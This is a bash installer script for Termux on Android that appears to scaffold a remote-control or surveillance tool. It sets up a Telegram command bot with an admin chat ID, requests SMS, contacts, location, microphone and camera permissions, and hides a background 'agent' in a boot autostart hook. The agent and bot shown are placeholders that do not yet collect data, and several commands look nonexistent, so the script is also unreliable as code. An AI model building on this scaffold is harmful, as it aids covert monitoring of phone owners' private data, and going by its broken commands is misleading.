#!/bin/bash

# ⚠️ Legal Disclaimer: This script must only be used with explicit consent. Unauthorized use is illegal.

# Modern ANSI UI Colors
RED='\033[1;31m'
GREEN='\033[1;32m'
YELLOW='\033[1;33m'
BLUE='\033[1;34m'
NC='\033[0m'

# Display Banner
echo -e "${BLUE}
╔═╗┌─┐┌┬┐┬─┐┌─┐┬  ┬┌─┐┬─┐  ╔═╗┌─┐┌─┐┬┌┐┌┌─┐
║  │ ││││├┬┘├┤ └┐┌┘├┤ ├┬┘  ║  ├─┤│  ││││└─┐
╚═╝└─┘┴ ┴┴└─└─┘ └┘ └─┘┴└─  ╚═╝┴ ┴└─┘┴┘└┘└─┘
${NC}"

# Check if running in Termux
if [ ! -d "/data/data/com.termux" ]; then
    echo -e "${RED}❌ This script must be run in Termux on Android.${NC}"
    exit 1
fi

# Setup configuration directory
CONFIG="$HOME/.nmcl_env"
echo -e "${YELLOW}📁 Setting up environment...${NC}"
mkdir -p ~/.nmcl && cd ~/.nmcl

# Install dependencies with error handling
echo -e "${YELLOW}🔄 Updating packages and installing dependencies...${NC}"
pkg update -y || { echo -e "${RED}❌ Failed to update packages.${NC}"; exit 1; }
pkg install -y termux-api python git || { echo -e "${RED}❌ Failed to install packages.${NC}"; exit 1; }
pip install python-telegram-bot requests || { echo -e "${RED}❌ Failed to install Python modules.${NC}"; exit 1; }

# Telegram bot token and admin setup
echo -e "${YELLOW}🔑 Configuring Telegram Bot...${NC}"
read -p "Enter Telegram Bot Token: " TOKEN
read -p "Enter Admin Chat ID: " ADMIN
echo "TOKEN=$TOKEN" > "$CONFIG"
echo "ADMIN=$ADMIN" >> "$CONFIG"
chmod 600 "$CONFIG"  # Secure the config file

# Grant necessary permissions
echo -e "${YELLOW}🔓 Granting permissions...${NC}"
termux-setup-storage
for perm in sms contacts location microphone camera; do
    termux-"$perm"-permission || echo -e "${RED}⚠️ Failed to grant $perm permission.${NC}"
done

# Create nmcl_agent.py locally (simplified example)
echo -e "${YELLOW}📝 Creating agent script...${NC}"
cat << 'EOF' > nmcl_agent.py
#!/usr/bin/env python3
import os
import time
from termux import Toast

while True:
    Toast.show("Agent Running...")
    time.sleep(60)  # Simple loop for demonstration
EOF
chmod +x nmcl_agent.py

# Create nmcl_bot.py locally (simplified example)
echo -e "${YELLOW}📝 Creating bot script...${NC}"
cat << 'EOF' > nmcl_bot.py
#!/usr/bin/env python3
import telegram
from telegram.ext import Updater, CommandHandler
import os

TOKEN = os.getenv("TOKEN", open(os.path.expanduser("~/.nmcl_env")).read().split("TOKEN=")[1].split("\n")[0])
ADMIN = os.getenv("ADMIN", open(os.path.expanduser("~/.nmcl_env")).read().split("ADMIN=")[1].strip())

def start(update, context):
    if str(update.message.chat_id) == ADMIN:
        update.message.reply_text("Bot is online!")
    else:
        update.message.reply_text("Unauthorized access.")

updater = Updater(TOKEN, use_context=True)
updater.dispatcher.add_handler(CommandHandler("start", start))
updater.start_polling()
updater.idle()
EOF
chmod +x nmcl_bot.py

# Setup autostart with modern approach
echo -e "${YELLOW}🔄 Setting up autostart...${NC}"
mkdir -p ~/.termux/boot
echo '#!/data/data/com.termux/files/usr/bin/sh' > ~/.termux/boot/nmcl_start
echo "exec python ~/.nmcl/nmcl_agent.py > /dev/null 2>&1 &" >> ~/.termux/boot/nmcl_start
chmod +x ~/.termux/boot/nmcl_start

# Launch services with process monitoring
echo -e "${YELLOW}🚀 Launching services...${NC}"
python nmcl_bot.py & BOT_PID=$!
python nmcl_agent.py & AGENT_PID=$!
sleep 2  # Give services time to start
if ps -p $BOT_PID > /dev/null && ps -p $AGENT_PID > /dev/null; then
    echo -e "${GREEN}✅ Installation Complete! Bot and Agent are running.${NC}"
else
    echo -e "${RED}❌ Failed to launch services.${NC}"
    exit 1
fi
